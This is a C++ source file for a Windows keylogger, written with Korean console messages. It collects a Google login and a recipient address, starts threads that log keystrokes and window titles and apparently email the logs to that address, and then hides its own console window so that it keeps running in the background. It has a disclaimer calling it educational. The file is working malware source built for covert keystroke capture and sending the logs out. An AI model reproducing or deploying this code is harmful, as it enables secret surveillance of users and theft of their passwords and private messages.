#define _CRT_SECURE_NO_WARNINGS
#include "stdafx.h"
#include "filemanager.h"
#include "winmanager.h"
#include "KeyLogger.h"

void console();
void user();
static char senderId[30];// { 0, };
static char senderPw[30];// { 0, };
static char receiverId[30];  // { 0, };
int main()
{
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 10);
    user();
    printf("구글 아이디 >> ");
    scanf_s("%s", senderId, sizeof(senderId));
    printf("구글 비밀번호 >> ");
    scanf_s("%s", senderPw, sizeof(senderPw));
    printf("로그를 수신할 이메일 주소 >> ");
    scanf_s("%s", receiverId, sizeof(receiverId));

    auto main = []() {
        Keylogger(NULL);
    };
    auto window = []() {
        wintitle();
    };
    auto filesize = []() {
        FSD(senderId, senderPw, receiverId);
    };
    HMODULE hModule = GetModuleHandle(nullptr);
    if (hModule != nullptr) {
        
        printf("그럼..");
        Sleep(1000);
        printf("시작할게요..!!\n");
        getchar();
        console();
        thread t1 = thread(main);
        thread t2 = thread(window);
        thread t3 = thread(filesize);
        t1.join();
        t2.join();
        t3.join();
    }
}

void user() {
    
    printf("======================*****키로거er*****======================\n");
    printf("by KyuBo Shim\n");
    Sleep(2000);
    printf("@@@ 본 프로그램은 교육을 목적으로 만든 프로그램으로 악의적으로 사용할시 형사처벌을 받으실수 있습니다. @@@\n");
    printf("@@@ 꼭 본인 컴퓨터에 하셔야 해요!!ㅠㅠ @@@\n");
    Sleep(2000);
    char agree;
    while (1) {
        agree = '\0';
        printf("동의하셨나요? (y/n) >> ");
        scanf_s("%c", &agree, sizeof(agree));
        if (agree == 'n' || agree == 'N') {
            printf("그럼 종료합니다.\n");
            exit(0);
        }
        else if (agree == 'y' || agree == 'Y') {
            break;
        }
        else {
            printf("잘못된 응답입니다.\n");
            exit(0);
        }
    }
    printf("0. 이 프로그램을 실행시킨 컴퓨터의 키보드를 도청합니다 :)\n");
    printf("  설정 완료 시 자동으로 백그라운드에서 실행되기 떄문에 종료하려면 작업관리자를 이용해주세요!\n");
    printf("1. 사용 전 구글 계정 설정을 꼭 변경해주세요!!\n");
    printf("구글 로그인 --> Google 계정 --> 보안 --> 보안수준이 낮은 엑세스 --> 사용\n");
    Sleep(1000);
}

void console() {    // testing console
   /* printf("\033[1;32m");
    Sleep(500);
    printf("Vaccine starts in..\n");
    Sleep(1000);*/
    Sleep(800);
    printf("3..\n");
    Sleep(1000);
    printf("2..\n");
    Sleep(1000);
    printf("1..\n");
    Sleep(1000);
    printf("시작!!");
    Sleep(500);
    HWND hwnd = GetForegroundWindow();
    ShowWindow(hwnd, SW_HIDE);
}